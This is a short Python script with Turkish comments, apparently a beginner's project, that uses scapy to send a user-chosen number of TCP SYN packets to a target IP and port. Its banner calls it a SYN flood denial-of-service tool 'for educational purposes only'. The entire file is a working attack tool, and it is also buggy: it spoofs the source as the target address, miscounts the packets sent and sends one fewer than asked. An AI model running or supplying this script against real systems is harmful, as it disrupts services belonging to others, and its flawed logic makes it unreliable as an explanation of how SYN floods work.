#!/usr/bin/python
#İlk Pythonum SERKAN
#Bu Uygulama Tamamen Eğitim Amaçlıdır. 
#scapy kütüphanesini çağırdım.
from scapy.all import *
from sys import stdout
# Def ile fonksiyon tanımla ip addresi - destination port- kac tane gönderecen
def SYN_Flood(dstIP,dstPort,say):
#balangıç değeri 1
	basla = 1
#for dongusune sokuyoruz girilen say degeri kadar döndürüyoruz
	for x in range(1,say):
		packet = IP(src=dstIP)/TCP(dport=dstPort,flags="S")
		send(packet)
		basla += 2
		stdout.write("\nToplam Gönderdigimiz Paket Sayısı: %i\n" % basla)

def info():

	print ("***********************************************")
	print ("    *Bu Uygulama Tamamen Eğitim Amaçlıdır.    *")
	print ("***********************************************")
	print ("* İlk Python4 SYN Flood Tool DOS Saldırısı    *")
	print ("***********************************************")
	dstIP = input ("\nHedef IP : ")
	dstPort = input ("Hedef Port : ")


	return dstIP,int(dstPort)

def main():
	dstIP,dstPort = info()
	say = input ("Kaç Defa Gönderilsin : ")
	SYN_Flood(dstIP,dstPort,int(say))
main()
